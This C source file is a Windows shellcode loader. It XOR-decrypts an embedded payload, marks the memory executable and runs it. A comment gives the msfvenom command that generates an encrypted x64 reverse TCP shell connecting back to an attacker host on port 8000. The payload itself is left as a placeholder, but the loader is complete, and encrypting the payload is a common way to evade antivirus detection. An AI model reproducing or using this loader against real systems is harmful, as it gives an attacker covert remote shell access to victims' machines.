#include <stdio.h>
#include <string.h>
#include <windows.h>

//msfvenom -p windows/x64/shell_reverse_tcp LHOST=eth0 LPORT=8000 -f c --encrypt xor --encrypt-key "XorEncryptedShellcode"

unsigned char Buf[] = 
"YOUR-GENERATED-SHELLCODE-HERE";

const char Key[] = "XorEncryptedShellcode";

int main()
{
	size_t Buflen = sizeof(Buf) - 1;

	LPVOID Exec = VirtualAlloc(NULL, Buflen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!Exec)
	{
		return 1;
	}

	size_t Keylen = strlen(Key);
	for (size_t i = 0; i < Buflen; i++)
	{
		Buf[i] ^= Key[i % Keylen];
	}

	memcpy(Exec, Buf, Buflen);

	DWORD Protect;

	if (!VirtualProtect(Exec, Buflen, PAGE_EXECUTE, &Protect))
	{
		VirtualFree(Exec, 0, MEM_RELEASE);
		return 1;
	}

	((void(*)())Exec)();
	VirtualFree(Exec, 0, MEM_RELEASE);

	return 0;
}
